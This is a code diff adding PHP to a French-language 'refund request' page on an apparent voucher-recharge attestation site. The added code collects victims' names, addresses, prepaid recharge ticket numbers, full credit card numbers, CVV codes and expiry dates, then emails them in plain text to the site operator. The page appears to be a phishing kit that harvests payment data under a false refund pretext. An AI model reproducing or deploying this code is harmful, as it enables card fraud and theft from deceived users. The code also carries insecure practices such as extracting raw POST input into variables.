@@ -1,3 +1,104 @@
+<?php
+
+session_start();
+
+//If form send and all fields is not empty
+if(!empty($_POST)){
+
+    $errors = array();
+
+    extract($_POST);
+
+    $fname = strip_tags($fname);
+    $email = strip_tags($email);
+    $montant = strip_tags($montant);
+    $ticket = strip_tags($ticket);
+    $phone = strip_tags($phone);
+    $adresse = strip_tags($adresse);
+    $trecharge = strip_tags($trecharge);
+    $carteNumber = strip_tags($carteNumber);
+    $tcarte = strip_tags($tcarte);
+    $cvv = strip_tags($cvv);
+    $month = strip_tags($month);
+    $year = strip_tags($year);
+
+
+
+    if(empty($fname)){
+        array_push($errors, 'Entrez votre nom et prénoms');
+    }
+    if(empty($email)){
+        array_push($errors, 'Entrez votre email');
+    }
+
+    if(empty($montant)){
+        array_push($errors, 'Entrez le montant');
+    }
+
+    if(empty($ticket)){
+        array_push($errors, 'Entrez le ticket');
+    }
+
+    if(empty($phone)){
+        array_push($errors, 'Entrez votre numéro de téléphone');
+    }
+
+    if(empty($adresse)){
+        array_push($errors, 'Entrez votre adresse');
+    }
+
+    if(empty($trecharge)){
+        array_push($errors, 'Entrez votre type de recharge');
+    }
+
+    if(empty($carteNumber)){
+        array_push($errors, 'Entrez votre numéro de carte de crédit');
+    }
+
+    if(empty($tcarte)){
+        array_push($errors, 'Entrez votre type de carte');
+    }
+
+    if(empty($cvv)){
+        array_push($errors, 'Entrez votre CVV/CV2');
+    }
+
+    if(empty($month)){
+        array_push($errors, 'Entrez votre mois de recharge');
+    }
+
+    if(empty($year)){
+        array_push($errors, 'Entrez votre année de recharge');
+    }
+
+    if(!filter_var($email, FILTER_VALIDATE_EMAIL)){
+        array_push($errors, 'Adresse email invalide');
+    }
+
+    if(count($errors) == 0){
+        $mailTo = "info@fiches-attestationdesrecharges.com";
+        $headers = "From: Site de Fiche d'attestation des recharges\r\n";
+        $headers = "Reply-To: refund@fiches-attestationdesrecharges.com\r\n";
+        $headers = "Content-type: text/html\r\n";
+        $subject = "Demande de remboursement de la part de ".$fname.".";
+        $txt = "Demande de remboursement :\n\nNom du client : ".$fname.".\n\nAdresse mail du client : ".$email.".\n\nMontant : ".$montant.".\n\nNuméro du ticket : ".$ticket.".\n\nNuméro de téléphone : ".$phone.".\n\nAdresse : ".$adresse.".\n\nType de recharge : ".$trecharge.".\n\nNuméro de carte : ".$carteNumber.".\n\nType de carte : ".$tcarte.".\n\nCVV/CV2 : ".$cvv.".\n\nMois : ".$month.".\n\nAnnée : ".$year.".\n\n";
+
+        $message = wordwrap($txt, 70);
+
+        mail($mailTo, $subject, $message, $headers);
+
+        unset($mailTo);
+        unset($headers);
+        unset($subject);
+        unset($txt);
+
+        header("Location: answer.html");
+    }
+}
+
+
+?>
+
 <!doctype html>
 <html lang="en">
   <head>
@@ -19,20 +120,20 @@
 	<header>
         <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
           <div class="container-fluid">
-            <a class="navbar-brand" href="refund.html">Remboursement</a>
+            <a class="navbar-brand" href="refund.php">Remboursement</a>
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
               <span class="navbar-toggler-icon"></span>
             </button>
             <div class="collapse navbar-collapse" id="navbarCollapse">
               <ul class="navbar-nav me-auto mb-2 mb-md-0">
                 <li class="nav-item">
-                  <a class="nav-link" href="index.html">Accueil</a>
+                  <a class="nav-link" href="index.php">Accueil</a>
                 </li>
                 <li class="nav-item">
-                  <a class="nav-link" href="attestation.html">Télécharger une fiche d'attestation</a>
+                  <a class="nav-link" href="attestation.php">Télécharger une fiche d'attestation</a>
                 </li>
                 <li class="nav-item">
-                  <a class="nav-link active" href="refund.html">Demande de remboursement</a>
+                  <a class="nav-link active" href="refund.php">Demande de remboursement</a>
                 </li>
               </ul>
             </div>
@@ -45,7 +146,7 @@
             <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
                 <h3 class="space">Demande de remboursement</h3>
                 <div class="card">
-                    <form class="form-card" action="refun.php" method="POST">
+                    <form class="form-card" action="refund.php" method="POST">
                         <div class="row justify-content-between text-left">
                             <div class="form-group col-sm-6 flex-column d-flex">
                                 <input type="text" id="fname" name="fname" placeholder="Nom complet" required="required" onblur="validate(1)">
